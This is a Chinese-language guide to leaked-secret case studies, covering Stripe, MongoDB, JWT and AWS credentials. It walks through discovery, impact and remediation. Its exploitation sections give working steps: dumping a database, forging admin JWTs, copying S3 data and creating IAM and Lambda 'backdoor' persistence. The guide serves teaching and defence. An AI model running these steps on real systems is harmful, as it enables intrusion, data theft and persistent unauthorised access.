# 敏感信息泄露实际案例研究

## 目录

1. [经典泄露案例](#经典泄露案例)
2. [典型场景分析](#典型场景分析)
3. [发现过程详解](#发现过程详解)
4. [漏洞利用演示](#漏洞利用演示)
5. [修复方案](#修复方案)
6. [经验教训总结](#经验教训总结)

## 经典泄露案例

### 案例1: JavaScript文件中的Stripe API密钥泄露

#### 背景信息
```
目标: 某电商网站的支付功能
技术栈: React + Node.js + Stripe
泄露位置: 前端JavaScript代码
泄露类型: Stripe Secret Key
```

#### 发现过程
```bash
# 1. 查看页面源码
访问 https://example.com/checkout

# 2. 查看HTML中的script标签
Ctrl+U 查看源代码

# 3. 发现内联JS配置
<script>
  const config = {
    stripeKey: 'sk_live_<STRIPE_KEY_EXAMPLE>',
    apiUrl: '/api/payment'
  };
</script>

# 4. 验证泄露
rg "sk_live_" . --glob "*.js"
```

#### 漏洞验证
```bash
# 使用Stripe API密钥测试（需授权）
curl -X POST https://api.stripe.com/v1/balance \
  -u sk_live_<STRIPE_KEY_EXAMPLE>

# 响应示例
{
  "object": "balance",
  "available": [...],
  "livemode": true,
  "status": "available"
}
```

#### 影响评估
```
严重程度: CRITICAL
- 攻击者可以使用此密钥进行支付交易
- 可以访问所有Stripe账户数据
- 可以创建虚假退款
- 造成直接经济损失

实际风险:
- 如果密钥有管理员权限，可操作用户资金
- 可查询所有交易记录和客户信息
- 可创建新的支付渠道进行欺诈
```

#### 修复方案
```javascript
// 修复前 (不推荐)
const stripe = Stripe('sk_live_<STRIPE_KEY_EXAMPLE>');

// 修复后 (推荐)
const stripe = Stripe(window.STRIPE_PUBLIC_KEY);

// 服务端生成临时Token
app.post('/api/create-payment-intent', async (req, res) => {
  const paymentIntent = await stripe.paymentIntents.create({
    amount: req.body.amount,
    currency: 'cny',
  });
  
  res.send({
    clientSecret: paymentIntent.client_secret,
  });
});
```

#### 配置管理建议
```bash
# .env.production
STRIPE_PUBLIC_KEY=pk_live_xxxxxxxxxxxxx
STRIPE_SECRET_KEY=sk_live_xxxxxxxxxxxxx  # 仅服务端使用

# .env.development
STRIPE_PUBLIC_KEY=pk_test_xxxxxxxxxxxxx
STRIPE_SECRET_KEY=sk_test_xxxxxxxxxxxxx
```

### 案例2: 前端代码中的数据库连接字符串

#### 背景信息
```
目标: 某企业内部系统
技术栈: Vue.js + Express.js + MongoDB
泄露位置: webpack打包的bundle.js
泄露类型: MongoDB连接字符串
```

#### 发现过程
```bash
# 1. 下载JS文件
wget https://app.example.com/static/js/main.bundle.js

# 2. 搜索数据库连接
rg "mongodb://" main.bundle.js

# 3. 发现泄露的连接字符串
mongodb://admin:P@ssw0rd123!@db.example.com:27017/app

# 4. 进一步搜索
rg "mongodb://" . -t js

# 5. 发现日志泄露
rg "connect.*mongodb" . -t js
```

#### 漏洞利用
```bash
# 1. 使用泄露的凭证连接数据库
mongo mongodb://admin:P@ssw0rd123!@db.example.com:27017/app

# 2. 查看数据库列表
show dbs

# 3. 查看用户集合
use app
show collections
db.users.find().pretty()

# 4. 导出敏感数据
db.users.find({}, {password: 1, email: 1, phone: 1}).forEach(printjson)
```

#### 影响评估
```
严重程度: CRITICAL
- 直接访问生产数据库
- 可读取、修改、删除所有数据
- 包含用户个人信息、财务数据
- 可能泄露其他系统的凭证

影响范围:
- 所有用户账户
- 交易记录
- 财务数据
- 其他系统的连接凭证
```

#### 修复方案
```javascript
// 修复前 (前端代码)
const mongoose = require('mongoose');
mongoose.connect('mongodb://admin:P@ssw0rd123!@db.example.com:27017/app');

// 修复后 (服务端环境变量)
const mongoose = require('mongoose');
mongoose.connect(process.env.MONGODB_URI, {
  authSource: 'admin',
  useNewUrlParser: true,
  useUnifiedTopology: true
});

// .env文件（绝对不要提交到版本控制）
MONGODB_URI=mongodb://admin:${MONGODB_PASSWORD}@db.example.com:27017/app
MONGODB_PASSWORD=P@ssw0rd123!
```

#### 额外安全措施
```bash
# 1. 立即更换数据库密码
mongosh
use admin
db.changeUserPassword('admin', 'NewSecurePassword!')

# 2. 检查数据库访问日志
db.getLogComponents()

# 3. 启用审计日志
db.adminCommand({setParameter: 1, auditAuthorizationSuccess: true})

# 4. 检查是否有未授权的访问
db.system.profile.find({}).sort({ts: -1}).limit(100)
```

### 案例3: API文档中的JWT密钥泄露

#### 背景信息
```
目标: 某SaaS平台的API文档
技术栈: Swagger/OpenAPI文档
泄露位置: API文档配置
泄露类型: JWT Secret Key
```

#### 发现过程
```bash
# 1. 访问API文档
访问 https://api.example.com/swagger-ui.html

# 2. 发现JWT配置
/swagger-resources
/swagger-resources/configuration/security

# 3. 发现泄露的JWT密钥
{
  "name": "jwt",
  "type": "apiKey",
  "in": "header",
  "name": "Authorization",
  "key": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
}

# 4. 搜索所有JWT
rg "eyJ[a-zA-Z0-9_-]*\.eyJ[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*" . -t json

# 5. 搜索JWT密钥配置
rg -i "jwt.*secret|secret.*key" . -t json
```

#### 漏洞利用
```python
import jwt
import requests

# 泄露的JWT密钥
JWT_SECRET = "MySuperSecretKey123456789"

# 解码现有Token
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
decoded = jwt.decode(token, JWT_SECRET, algorithms=['HS256'])
print(decoded)
# {'user_id': 123, 'role': 'user', 'exp': 1700000000}

# 创建伪造的管理员Token
payload = {
    'user_id': 123,
    'role': 'admin',
    'exp': 9999999999
}
fake_token = jwt.encode(payload, JWT_SECRET, algorithm='HS256')

# 使用伪造Token访问API
response = requests.get(
    'https://api.example.com/admin/users',
    headers={'Authorization': f'Bearer {fake_token}'}
)
print(response.status_code)
print(response.json())
```

#### 影响评估
```
严重程度: HIGH
- 可伪造任意用户的Token
- 可提升权限为管理员
- 可访问未授权的API端点
- 可执行特权操作

利用难度: 低
- JWT密钥已泄露
- 解密和伪造工具易获取
- 成功率100%
```

#### 修复方案
```java
// 修复前 (配置文件中)
spring:
  jwt:
    secret: MySuperSecretKey123456789
    expiration: 3600000

// 修复后 (使用环境变量)
spring:
  jwt:
    secret: ${JWT_SECRET}
    expiration: ${JWT_EXPIRATION:3600000}

// 生成安全的密钥
openssl rand -base64 32
# 输出: YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXoxMjM0NTY3ODkw
```

### 案例4: Git历史中的AWS密钥泄露

#### 背景信息
```
目标: 某初创公司的GitHub仓库
泄露位置: 早期提交的历史代码
泄露类型: AWS Access Key和Secret Key
```

#### 发现过程
```bash
# 1. 克隆仓库
git clone https://github.com/example/app.git
cd app

# 2. 使用gitleaks扫描
gitleaks --repo-path=. --verbose

# 3. 手动搜索AWS密钥
rg -i "aws_access_key|aws_secret" . --glob "!.git/**" --hidden

# 4. 查看Git历史
git log --all --source --oneline

# 5. 搜索特定提交
git log --all -S "AKIA" --oneline

# 6. 查看具体提交
git show abc123:config/aws.js

# 7. 使用trufflehog扫描
docker run -v "$(pwd):/scan" trufflesecurity/trufflehog:latest git file:///scan
```

#### 漏洞利用
```bash
# 1. 配置AWS凭证
aws configure
# AWS Access Key ID: AKIA<AWS_KEY_ID_EXAMPLE>
# AWS Secret Access Key: <AWS_SECRET_KEY_EXAMPLE>

# 2. 测试访问
aws sts get-caller-identity

# 3. 列出S3桶
aws s3 ls

# 4. 访问EC2实例
aws ec2 describe-instances

# 5. 访问DynamoDB
aws dynamodb list-tables

# 6. 访问Lambda函数
aws lambda list-functions
```

#### 影响评估
```
严重程度: CRITICAL
- 完全访问AWS账户
- 可访问所有AWS服务
- 可创建/删除资源
- 可造成巨额账单

财务风险:
- 攻击者可能挖矿
- 创建大量EC2实例
- 存储TB级数据
- 预估损失可达数十万美元/月
```

#### 修复方案
```bash
# 1. 立即删除泄露的密钥
aws iam delete-access-key --access-key-id AKIA<AWS_KEY_ID_EXAMPLE> --user-name <username>

# 2. 创建新的密钥
aws iam create-access-key --user-name <username>

# 3. 启用MFA
aws iam enable-mfa-device --user-name <username> --serial-number <mfa-serial-number>

# 4. 清理Git历史（谨慎操作）
git filter-branch --force --index-filter \
  'git rm --cached --ignore-unmatch config/aws.js' \
  --prune-empty --tag-name-filter cat -- --all

# 5. 重写提交历史
git push origin --force --all
git push origin --force --tags

# 6. 建议使用Git历史清理工具
# BFG Repo-Cleaner: https://rtyley.github.io/bfg-repo-cleaner/
```

#### AWS账户安全检查
```bash
# 1. 检查CloudTrail日志
aws cloudtrail lookup-events --max-results 50

# 2. 检查异常API调用
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=ConsoleLogin \
  --start-time 2024-01-01T00:00:00Z

# 3. 检查未加密的S3桶
aws s3api list-buckets --query 'Buckets[].Name'

# 4. 检查开放的安全组规则
aws ec2 describe-security-groups --filters Name=ip-permission.cidr,Values='0.0.0.0/0'

# 5. 检查Root账户使用情况
aws iam get-credential-report
```

## 典型场景分析

### 场景1: 前端配置泄露

#### 常见泄露点
```javascript
// 1. 内联配置对象
window.APP_CONFIG = {
  apiUrl: 'https://api.example.com',
  apiKey: 'sk_live_xxx',
  debug: true
};

// 2. 环境变量在HTML中硬编码
<script>
  window.API_KEY = 'pk_live_xxx';
  window.TOKEN = 'ghp_xxx';
</script>

// 3. 第三方SDK配置
<script src="https://sdk.example.com/sdk.js?key=xxx&secret=yyy"></script>

// 4. Firebase配置
const firebaseConfig = {
  apiKey: "AIzaSyD...",
  authDomain: "app.firebaseapp.com",
  projectId: "app",
  storageBucket: "app.appspot.com"
};
```

#### 扫描命令
```bash
# 扫描所有HTML文件中的内联JS
rg -t html '<script[^>]*>[\s\S]*?(apiKey|password|secret|token)[\s\S]*?</script>'

# 扫描window对象配置
rg "window\.(CONFIG|APP|API|ENV)" . -t js

# 扫描环境变量模式
rg "\.(env|process\.env)\." . -t js

# 扫描第三方服务初始化
rg "(stripe|firebase|aws|sentry)\.init" . -t js
```

### 场景2: 错误信息泄露

#### 常见泄露点
```java
// Java Spring Boot
try {
    // database operation
} catch (Exception e) {
    logger.error("Database connection failed: " + e);
    return "Error: " + e.getMessage();
}

// 泄露的堆栈跟踪
{
  "error": "Database connection failed",
  "details": "com.mysql.jdbc.exceptions.jdbc4.CommunicationsException: 
              Communications link failure\n
              Last packet sent to the server was 0 ms ago.\n
              at sun.reflect.NativeConstructorAccessImpl...",
  "stack": [
    "at com.example.dao.UserDAO.getConnection(UserDAO.java:45)",
    "at com.example.service.UserService.getUserById(UserService.java:123)"
  ]
}
```

#### 扫描命令
```bash
# 扫描错误处理代码
rg -t java "catch.*Exception.*\{[^}]*logger\.error" 

# 扫描堆栈跟踪输出
rg -t java "printStackTrace|e\.printStackTrace" 

# 扫描错误响应
rg -t js -t ts "res\.status.*send.*error|response\.data" 

# 扫描调试模式
rg -i "(debug|verbose|trace).*enabled" . -t js
```

### 场景3: 备份文件泄露

#### 常见泄露点
```bash
# 文件备份
cp config.php config.php.bak
cp config.php config.php.old
cp config.php config.php.backup

# 数据库备份
mysqldump -u root -p app > app_backup.sql
mongodump --uri="mongodb://admin:password@localhost:27017" --out=backup/

# 代码备份
zip -r backup.zip app/
tar -czf backup.tar.gz app/

# IDE配置
.idea/workspace.xml
.vscode/settings.json
```

#### 扫描命令
```bash
# 扫描备份文件
Get-ChildItem -Recurse | Where-Object {
  $_.Name -match "\.(bak|backup|old|orig|orig|save|tmp|bck)$"
}

# 扫描压缩包
Get-ChildItem -Recurse -Include *.zip,*.tar,*.gz,*.rar,*.7z

# 扫描SQL备份
Get-ChildItem -Recurse -Include *.sql

# 扫描数据库文件
Get-ChildItem -Recurse -Include *.db,*.sqlite,*.mdb,*.accdb
```

### 场景4: 配置文件泄露

#### 常见泄露点
```yaml
# docker-compose.yml
services:
  db:
    environment:
      MYSQL_ROOT_PASSWORD: "rootpassword123"
      MYSQL_DATABASE: "app"
      MYSQL_USER: "admin"
      MYSQL_PASSWORD: "admin123"

# kubernetes secret
apiVersion: v1
kind: Secret
metadata:
  name: app-secrets
type: Opaque
stringData:
  database-url: "mysql://admin:password@localhost/app"
  api-key: "sk_live_xxx"

# .htaccess
AuthName "Restricted Area"
AuthUserFile /var/www/.htpasswd
```

#### 扫描命令
```bash
# 扫描所有YAML配置文件
rg -t yaml -i "(password|secret|key|token|credential):\s*[\"'][^\"']+[\"']"

# 扫描Kubernetes Secret
rg -t yaml "stringData:" . --glob "*.yaml"

# 扫描.htpasswd
Get-ChildItem -Recurse -Include .htpasswd

# 扫描.htaccess中的配置
Get-ChildItem -Recurse -Include .htaccess
```

## 发现过程详解

### Web应用发现流程

#### 步骤1: 目标侦察
```bash
# 1. 收集子域名
subfinder -d example.com -o subdomains.txt
amass enum -d example.com -o subdomains.txt

# 2. 扫描开放端口
nmap -p 80,443,8080,8443 -sV example.com

# 3. 识别技术栈
whatweb https://example.com

# 4. 下载源码
wget -r -l 5 https://example.com/static/js/
```

#### 步骤2: 前端代码分析
```bash
# 1. 列出所有JS文件
rg -t js -l "." . 

# 2. 搜索敏感关键词
rg -i "api[_-]?key|password|token|secret" . -t js

# 3. 搜索数据库连接
rg -i "mongodb|mysql|postgres|redis|sqlserver" . -t js

# 4. 搜索JWT和Token
rg "eyJ[a-zA-Z0-9_-]*\." . -t js

# 5. 分析API端点
rg "fetch\(|axios\(|http\." . -t js | rg -o "['\"](https?://[^'\"]+|/[a-zA-Z0-9/_-]+)['\"]"
```

#### 步骤3: API文档扫描
```bash
# 1. 发现API文档
# 常见路径
/swagger-ui.html
/swagger-ui/index.html
/api-docs
/api/documentation
/v1/api-docs
/v2/api-docs
/docs
/documentation

# 2. 下载OpenAPI规范
wget https://api.example.com/v2/api-docs -O openapi.json

# 3. 分析API规范
rg "security|apiKey|bearer|jwt|oauth" openapi.json

# 4. 搜索配置中的密钥
rg "key|token|secret" openapi.json
```

#### 步骤4: 源代码审计
```bash
# 1. 识别源代码仓库
# GitHub
github-search -t code "example.com" --filename "*.js"

# 2. 搜索泄露的仓库
# GitHub
site:github.com "example.com" "password"

# 3. 使用gitrob扫描
gitrob clone https://github.com/example/app
gitrob analyze

# 4. 使用trufflehog扫描
docker run trufflesecurity/trufflehog:latest git https://github.com/example/app
```

### 移动应用发现流程

#### 步骤1: 应用获取
```bash
# Android APK
# 方式1: 直接下载APK
wget https://play.example.com/app.apk

# 方式2: 从设备提取
adb shell pm list packages
adb shell pm path com.example.app
adb pull /data/app/com.example.app/base.apk

# iOS IPA
# 需要越狱设备
ssh user@iphone
dpkg -l | grep com.example.app
scp root@iphone:/var/mobile/Containers/Bundle/Application/xxx/App.ipa ./
```

#### 步骤2: 应用反编译
```bash
# Android APK反编译
# 使用apktool
apktool d app.apk -o decompiled/

# 使用jadx
jadx-gui app.apk

# 使用Androguard
androgui.py app.apk

# iOS IPA分析
# 使用class-dump
class-dump -H App.ipa -o headers/

# 使用Frida脚本
frida -U -f com.example.app -l script.js
```

#### 步骤3: 敏感数据分析
```bash
# 1. 提取字符串
strings app.apk | rg "password|key|token|secret"

# 2. 搜索硬编码数据
rg -i "api_key|password|token|secret" decompiled/

# 3. 检查本地存储
# Android
Get-ChildItem decompiled/ -Recurse -Include "*.xml", "*.db", "*.shared_prefs"

# iOS
Get-ChildItem headers/ -Recurse | rg "(NSUserDefaults|Keychain)"

# 4. 分析网络请求
# 使用Burp Suite代理抓包
# 检查HTTP历史记录
```

### API接口发现流程

#### 步骤1: API端点枚举
```bash
# 1. 扫描常见路径
dirb https://api.example.com /usr/share/wordlists/common.txt

# 2. 发现隐藏API
ffuf -w wordlist.txt -u https://api.example.com/FUZZ

# 3. 分析前端代码中的API调用
rg "fetch\(|axios\(" . -t js -o "(https?://[^\"']+|/[a-zA-Z0-9/_-]+)" | sort -u

# 4. 暴力破解API路径
wfuzz -z file,wordlist.txt -u https://api.example.com/api/FUZZ
```

#### 步骤2: 请求/响应分析
```bash
# 使用Burp Suite
# 1. 配置代理
export http_proxy=http://localhost:8080
export https_proxy=http://localhost:8080

# 2. 抓取请求
curl -x http://localhost:8080 https://api.example.com/api/users

# 3. 分析请求头
# 查找Authorization、Cookie等认证信息
# 查找X-API-Key等自定义头

# 4. 分析响应
# 查找敏感信息泄露
# 查找错误信息中的堆栈跟踪
```

#### 步骤3: 认证机制测试
```bash
# 1. JWT测试
# 解码Token
echo "eyJ..." | cut -d. -f2 | base64 -d

# 测试算法篡改
# 将HS256改为none
echo "eyJ..." | python3 jwt_tool.py -T

# 2. API Key测试
# 测试不同的Key
curl -H "X-API-Key: invalid_key" https://api.example.com/api/data

# 3. 认证绕过
# 测试空Token
curl -H "Authorization: " https://api.example.com/api/admin

# 测试不存在的Token
curl -H "Authorization: Bearer invalid_token" https://api.example.com/api/admin
```

## 漏洞利用演示

### 1. 数据库凭据利用

#### 场景
发现前端JavaScript中硬编码的MongoDB连接字符串。

#### 利用步骤
```bash
# 1. 发现泄露
rg "mongodb://" . -t js
# 输出: mongodb://admin:P@ssw0rd@db.example.com:27017/app

# 2. 安装MongoDB客户端
# Windows
choco install mongodb

# 3. 连接数据库
mongo "mongodb://admin:P%40ssw0rd@db.example.com:27017/app"

# 4. 枚举数据库
show dbs
use app
show collections

# 5. 提取数据
db.users.find({}, {password: 0}).limit(10).pretty()

# 6. 导出用户数据
mongoexport --uri="mongodb://admin:P%40ssw0rd@db.example.com:27017/app" \
  --collection=users \
  --out=users.json

# 7. 检查是否有支付信息
db.orders.find().limit(10).pretty()
```

### 2. JWT密钥利用

#### 场景
在API文档配置中发现JWT签名密钥。

#### 利用步骤
```python
import jwt
import requests

# 1. 提取JWT密钥
JWT_SECRET = "泄露的密钥"

# 2. 获取有效的用户Token
# 假设通过正常登录获取
legitimate_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
decoded = jwt.decode(legitimate_token, JWT_SECRET, algorithms=['HS256'], options={"verify_signature": False})
print(decoded)
# {'user_id': 123, 'username': 'normal_user', 'role': 'user', 'exp': 1700000000}

# 3. 伪造管理员Token
fake_payload = {
    'user_id': 123,
    'username': 'normal_user',
    'role': 'admin',
    'exp': 9999999999
}
fake_token = jwt.encode(fake_payload, JWT_SECRET, algorithm='HS256')

# 4. 测试伪造的Token
response = requests.get(
    'https://api.example.com/api/admin/users',
    headers={'Authorization': f'Bearer {fake_token}'}
)
print(f"Status: {response.status_code}")
print(f"Response: {response.json()}")

# 5. 尝试其他特权操作
# 创建新管理员
response = requests.post(
    'https://api.example.com/api/admin/users',
    headers={'Authorization': f'Bearer {fake_token}'},
    json={'username': 'hacker', 'password': 'NewPass123', 'role': 'admin'}
)

# 6. 获取敏感数据
response = requests.get(
    'https://api.example.com/api/admin/export-all-data',
    headers={'Authorization': f'Bearer {fake_token}'}
)
```

### 3. 云服务密钥利用

#### 场景
在Git历史中发现AWS访问密钥。

#### 利用步骤
```bash
# 1. 配置AWS CLI
aws configure
# 输入泄露的Access Key和Secret Key

# 2. 验证凭证
aws sts get-caller-identity

# 3. 列出S3桶
aws s3 ls

# 4. 列出EC2实例
aws ec2 describe-instances

# 5. 列出Lambda函数
aws lambda list-functions

# 6. 下载S3中的数据
aws s3 sync s3://app-data-bucket ./downloads/

# 7. 创建持久性后门
# 创建新的IAM用户
aws iam create-user --user-name "backdoor"

# 创建访问密钥
aws iam create-access-key --user-name "backdoor"

# 添加管理员权限
aws iam attach-user-policy --user-name "backdoor" --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"

# 8. 创建Lambda后门
aws lambda create-function \
  --function-name "backdoor" \
  --runtime python3.9 \
  --role "arn:aws:iam::123456789012:role/lambda-exec-role" \
  --handler "backdoor.handler" \
  --zip-file fileb://backdoor.zip
```

## 修复方案

### 通用修复原则

#### 1. 立即响应
```bash
# 1. 禁用泄露的凭据
# 数据库
ALTER USER 'admin'@'%' IDENTIFIED BY 'NewSecurePassword!';
FLUSH PRIVILEGES;

# API密钥
# 在相应平台撤销密钥

# 云服务密钥
aws iam delete-access-key --access-key-id <ACCESS_KEY_ID>
```

#### 2. 清理Git历史
```bash
# 使用BFG Repo-Cleaner
java -jar bfg.jar --delete-files "*.key" repo/
java -jar bfg.jar --replace-text passwords.txt repo/

# 手动清理
git filter-branch --force --index-filter \
  'git rm --cached --ignore-unmatch filename' \
  --prune-empty --tag-name-filter cat -- --all

# 强制推送
git push origin --force --all
git push origin --force --tags
```

#### 3. 审计和监控
```bash
# 1. 启用审计日志
# AWS CloudTrail
aws cloudtrail create-trail --name my-trail --s3-bucket-name my-bucket

# 数据库审计
# MySQL
SET GLOBAL general_log = 'ON';
SET GLOBAL general_log_file = '/var/log/mysql/audit.log';

# 2. 设置告警
# AWS SNS主题
aws sns create-topic --name security-alerts

# 3. 定期检查
# 检查未授权的访问
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventSource,AttributeValue=iam.amazonaws.com
```

### 代码级修复

#### JavaScript/TypeScript
```javascript
// 修复前 (不推荐)
const API_KEY = 'sk_live_xxx';
const dbPassword = 'password123';

async function fetchData() {
  const response = await fetch(API_URL, {
    headers: { 'X-API-Key': API_KEY }
  });
}

// 修复后 (推荐)
import dotenv from 'dotenv';
dotenv.config({ path: '.env.production' });

const API_KEY = process.env.API_KEY;
const dbPassword = process.env.DB_PASSWORD;

async function fetchData() {
  const response = await fetch(API_URL, {
    headers: { 'X-API-Key': API_KEY }
  });
}

// 绝对不要在前端代码中硬编码敏感信息
// 使用环境变量和配置中心
```

#### Python
```python
# 修复前 (不推荐)
AWS_ACCESS_KEY = 'AKIA<AWS_KEY_ID_EXAMPLE>'
AWS_SECRET_KEY = '<AWS_SECRET_KEY_EXAMPLE>'
STRIPE_KEY = 'sk_live_xxx'

# 修复后 (推荐)
import os
from dotenv import load_dotenv

load_dotenv('.env.production')

AWS_ACCESS_KEY = os.getenv('AWS_ACCESS_KEY')
AWS_SECRET_KEY = os.getenv('AWS_SECRET_KEY')
STRIPE_KEY = os.getenv('STRIPE_KEY')

# 使用AWS SDK自动获取凭证
import boto3
s3 = boto3.client('s3')  # 自动使用IAM角色或环境变量
```

#### Java
```java
// 修复前 (不推荐)
@Bean
public DataSource dataSource() {
    DriverManagerDataSource dataSource = new DriverManagerDataSource();
    dataSource.setDriverClassName("com.mysql.cj.jdbc.Driver");
    dataSource.setUrl("jdbc:mysql://localhost:3306/app");
    dataSource.setUsername("root");
    dataSource.setPassword("password123");  // 硬编码密码！
    return dataSource;
}

// 修复后 (推荐)
@Bean
public DataSource dataSource() {
    DriverManagerDataSource dataSource = new DriverManagerDataSource();
    dataSource.setDriverClassName("com.mysql.cj.jdbc.Driver");
    dataSource.setUrl(System.getenv("DB_URL"));
    dataSource.setUsername(System.getenv("DB_USERNAME"));
    dataSource.setPassword(System.getenv("DB_PASSWORD"));
    return dataSource;
}

// 使用Spring Cloud Config或Vault
@Value("${spring.datasource.password}")
private String dbPassword;
```

### 配置管理修复

#### ENV文件管理
```bash
# 1. 创建.gitignore规则
echo ".env" >> .gitignore
echo ".env.local" >> .gitignore
echo ".env.*.local" >> .gitignore

# 2. 创建示例配置
cp .env .env.example
# 编辑.env.example，使用占位符替换敏感值
sed -i 's/DB_PASSWORD=.*/DB_PASSWORD=YOUR_PASSWORD_HERE/' .env.example

# 3. 使用密钥管理服务
# AWS Secrets Manager
aws secretsmanager create-secret --name db-password --secret-string "actual_password"

# 获取密钥
aws secretsmanager get-secret-value --secret-id db-password --query SecretString --output text

# 4. 使用配置中心
# Spring Cloud Config
# Consul
# Etcd
```

#### Docker配置修复
```yaml
# docker-compose.yml 修复前
services:
  db:
    environment:
      MYSQL_ROOT_PASSWORD: "password123"

# docker-compose.yml 修复后
services:
  db:
    environment:
      MYSQL_ROOT_PASSWORD: ${MYSQL_ROOT_PASSWORD}
    env_file:
      - ./secrets/.env

# secrets/.env (添加到.gitignore)
MYSQL_ROOT_PASSWORD=SecurePassword123!
```

## 经验教训总结

### 1. 预防胜于治疗

#### 最佳实践
```
1. 永不硬编码
   ✗ const key = 'sk_live_xxx';
   ✓ const key = process.env.API_KEY;

2. 最小权限原则
   ✗ IAM管理员权限
   ✓ 仅授予必要权限

3. 密钥轮换
   ✗ 永不过期
   ✓ 定期自动轮换（90天）

4. 安全审计
   ✗ 无日志
   ✓ 完整审计日志

5. 代码审查
   ✗ 直接提交到main
   ✓ PR审查时检查敏感信息
```

### 2. 检测能力建设

#### 工具链集成
```bash
# 开发阶段
- pre-commit hooks: 扫描提交的代码
- IDE插件: 实时提示敏感信息
- Linter规则: 禁止硬编码

# CI/CD阶段
- GitHub Actions: 集成gitleaks
- GitLab CI: 集成Secret Detection
- Jenkins: 集成TruffleHog

# 生产阶段
- 定期扫描: 自动化安全扫描
- 实时监控: AWS CloudTrail
- 告警机制: SNS + Lambda
```

#### 自动化检测示例
```yaml
# .github/workflows/security-scan.yml
name: Security Scan
on: [push, pull_request]

jobs:
  secrets-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
        with:
          fetch-depth: 0
      
      - name: Run Gitleaks
        uses: gitleaks/gitleaks-action@v2
      
      - name: Run TruffleHog
        run: |
          docker run -v "${{ github.workspace }}:/scan" \
            trufflesecurity/trufflehog:latest \
            git file:///scan

      - name: Upload Results
        if: always()
        uses: actions/upload-artifact@v3
        with:
          name: scan-results
          path: |
            gitleaks-report.json
            trufflehog-report.json
```

### 3. 应急响应流程

#### 发现泄露后的行动
```
时间线:
T+0: 发现泄露
  ✓ 立即报告安全团队
  ✓ 不要尝试利用
  ✓ 记录发现细节

T+15min: 初步评估
  ✓ 确定泄露范围
  ✓ 评估影响程度
  ✓ 启动应急响应

T+1hour: 遏制措施
  ✓ 禁用/轮换凭据
  ✓ 阻断未授权访问
  ✓ 启用额外监控

T+24hour: 彻底清理
  ✓ 清理Git历史
  ✓ 通知受影响方
  ✓ 发布安全公告

T+1week: 复盘改进
  ✓ 分析泄露原因
  ✓ 完善防护措施
  ✓ 培训相关人员
```

### 4. 文化与培训

#### 安全意识培训
```
季度培训内容:
1. 第一季度: 密码安全与密钥管理
2. 第二季度: 代码安全最佳实践
3. 第三季度: 渗透测试基础
4. 第四季度: 应急响应演练

培训形式:
- 线上课程: 每季度完成
- 实战演练: 每半年一次
- 知识竞赛: 每年一次
```

#### 激励与惩罚
```
正向激励:
- 发现并报告漏洞: 奖励积分
- 提出安全改进建议: 表扬和奖励
- 安全培训完成: 认证证书

负向激励:
- 泄露敏感信息: 纪律处分
- 违反安全策略: 绩效扣分
- 重复违规: 加强培训
```

### 5. 技术选型建议

#### 密钥管理工具对比
```
AWS Secrets Manager:
  优点: 完全托管、自动轮换、与AWS服务深度集成
  缺点: 仅适用于AWS、额外成本
  适用: AWS环境、微服务架构

HashiCorp Vault:
  优点: 多云支持、开源、高度可定制
  缺点: 运维复杂、学习曲线陡峭
  适用: 多云环境、需要高灵活性

Azure Key Vault:
  优点: 与Azure服务集成、硬件安全模块支持
  缺点: 仅适用于Azure
  适用: Azure环境

GitGuardian:
  优点: 专注于Git扫描、CI/CD集成好
  缺点: SaaS服务、数据外传
  适用: 需要全面Git扫描
```

### 6. 持续改进

#### 指标监控
```
关键指标 (KPI):
1. 敏感信息泄露事件数
   - 目标: 同比下降80%
   - 衡量: 季度统计

2. 密钥轮换完成率
   - 目标: 100%
   - 衡量: 月度审计

3. 安全培训完成率
   - 目标: 100%
   - 衡量: 季度跟踪

4. 平均检测时间 (MTTD)
   - 目标: < 24小时
   - 衡量: 事件统计

5. 平均响应时间 (MTTR)
   - 目标: < 1小时
   - 衡量: 事件统计
```

#### 成熟度模型
```
Level 1: 初始级
- 无明确的密钥管理流程
- 依赖人工操作
- 无监控告警

Level 2: 基础级
- 使用ENV文件管理密钥
- 有基本的审计日志
- 定期手动轮换

Level 3: 规范级
- 密钥管理平台
- 自动化轮换
- 实时监控告警

Level 4: 量化级
- 完整的配置管理
- 安全扫描集成CI/CD
- 性能指标监控

Level 5: 优化级
- AI辅助威胁检测
- 自动化应急响应
- 持续优化流程
```
